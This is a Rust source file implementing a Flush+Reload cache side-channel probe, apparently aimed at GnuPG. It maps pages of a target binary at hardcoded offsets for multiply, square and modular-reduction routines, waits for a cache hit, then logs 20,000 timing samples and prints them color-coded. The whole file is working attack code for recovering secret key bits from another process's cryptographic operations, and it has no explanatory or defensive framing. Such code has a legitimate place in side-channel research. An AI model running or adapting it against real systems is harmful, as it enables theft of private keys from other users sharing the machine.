extern crate colored;
extern crate libc;
extern crate memmap;
extern crate page_size;
use self::libc::close;
use self::libc::mmap;
use self::libc::open;
use self::memmap::Mmap;
use self::memmap::MmapOptions;
use asm;
use colored::*;
use std::ffi;
use std::fs::File;
use std::io::Write;
use std::path::Path;

pub mod gpg_probe {
    use super::*;
    const MUL_OFFSET: usize = 0x8f67d;
    const SQR_OFFSET: usize = 0x8fc89;
    const MOD_OFFSET: usize = 0x8ed5c;
    const SLOT_TIME: u64 = 2_500;
    const SLOTS: usize = 20_000;
    pub unsafe fn probe(threshhold: u32, path: &Path) {
        let mut mul_timings: [u64; SLOTS] = [0; SLOTS];
        let mut sqr_timings: [u64; SLOTS] = [0; SLOTS];
        let mut mod_timings: [u64; SLOTS] = [0; SLOTS];
        println!("{}", format!("Scanning...").red().bold());
        /*
            wait for threshhold
        */
        let c_path = ffi::CString::new(path.to_str().unwrap()).unwrap();
        let fd = open(c_path.into_raw(), libc::O_RDONLY);
        if fd == -1 {
            panic!("Error opening file!");
        }
        let mul_mmap = mmap(
            0 as *mut libc::c_void,
            page_size::get() as libc::size_t,
            libc::PROT_READ,
            libc::MAP_PRIVATE,
            fd,
            (MUL_OFFSET & !((page_size::get()) - 1)) as libc::off_t,
        ) as *mut u8;
        let sqr_mmap = mmap(
            0 as *mut libc::c_void,
            page_size::get() as libc::size_t,
            libc::PROT_READ,
            libc::MAP_PRIVATE,
            fd,
            (SQR_OFFSET & !((page_size::get()) - 1)) as libc::off_t,
        ) as *mut u8;
        let mod_mmap = mmap(
            0 as *mut libc::c_void,
            page_size::get() as libc::size_t,
            libc::PROT_READ,
            libc::MAP_PRIVATE,
            fd,
            (MOD_OFFSET & !((page_size::get()) - 1)) as libc::off_t,
        ) as *mut u8;
        close(fd);
        if mul_mmap as i8 == -1 || sqr_mmap as i8 == -1 || mod_mmap as i8 == -1 {
            panic!("Error mapping addresses.");
        }
        loop {
            let mut start_time = asm::get_rdtsc();
            let finish_time = start_time + SLOT_TIME;
            unsafe {
                let mul_ptr: *mut u8 = mul_mmap;
                let sqr_ptr: *mut u8 = sqr_mmap;
                let mod_ptr: *mut u8 = mod_mmap;
                let mul_time = asm::full_flush_reload_time(
                    mul_ptr.add((MUL_OFFSET & ((page_size::get()) - 1))),
                );
                let sqr_time = asm::full_flush_reload_time(
                    sqr_ptr.add((SQR_OFFSET & ((page_size::get()) - 1))),
                );
                let mod_time = asm::full_flush_reload_time(
                    mod_ptr.add((MOD_OFFSET & ((page_size::get()) - 1))),
                );
                if (mul_time as u32) < threshhold
                    || (sqr_time as u32) < threshhold
                    || (mod_time as u32) < threshhold
                {
                    println!("Threshold found\n");
                    mul_timings[0] = mul_time;
                    sqr_timings[0] = sqr_time;
                    mod_timings[0] = mod_time;
                    break;
                }
            }
            while start_time < finish_time {
                start_time = asm::get_rdtsc();
            }
        }

        for i in 1..SLOTS {
            let mut start_time = asm::get_rdtsc();
            let finish_time = start_time + SLOT_TIME;
            let mul_ptr = mul_mmap;
            let sqr_ptr = sqr_mmap;
            let mod_ptr = mod_mmap;
            let mul_time =
                asm::full_flush_reload_time(mul_ptr.add((MUL_OFFSET & ((page_size::get()) - 1))));
            let sqr_time =
                asm::full_flush_reload_time(sqr_ptr.add((SQR_OFFSET & ((page_size::get()) - 1))));
            let mod_time =
                asm::full_flush_reload_time(mod_ptr.add((MOD_OFFSET & ((page_size::get()) - 1))));
            mul_timings[i] = mul_time;
            sqr_timings[i] = sqr_time;
            mod_timings[i] = mod_time;
            while start_time < finish_time {
                start_time = asm::get_rdtsc();
            }
        }
        print_arr(&mul_timings, &sqr_timings, &mod_timings, threshhold);
    }

}
pub fn print_arr(arr: &[u64], arr_1: &[u64], arr_2: &[u64], threshhold: u32) {
    for i in 0..arr.len() {
        let elem: String = format!("{}", arr[i]);
        let elem1: String = format!("{}", arr_1[i]);
        let elem2: String = format!("{}", arr_2[i]);
        let colored_elem: ColoredString;
        let colored_elem1: ColoredString;
        let colored_elem2: ColoredString;
        if arr[i] as u32 > threshhold {
            colored_elem = elem.red();
        } else {
            colored_elem = elem.green();
        }
        if arr_1[i] as u32 > threshhold {
            colored_elem1 = elem1.red();
        } else {
            colored_elem1 = elem1.green();
        }
        if arr_2[i] as u32 > threshhold {
            colored_elem2 = elem2.red();
        } else {
            colored_elem2 = elem2.green();
        }
        println!("{}, {}, {}", colored_elem, colored_elem1, colored_elem2);
    }
}
pub fn print_triplets(arr: u64, arr_1: u64, arr_2: u64, threshhold: u32) {
    let elem: String = format!("{}, {}, {}", arr, arr_1, arr_2);
    let colored_elem: ColoredString;
    if arr as u32 > threshhold && arr_1 as u32 > threshhold && arr_2 as u32 > threshhold {
        colored_elem = elem.red();
    } else {
        colored_elem = elem.green();
        println!("{}", colored_elem);
    }
}
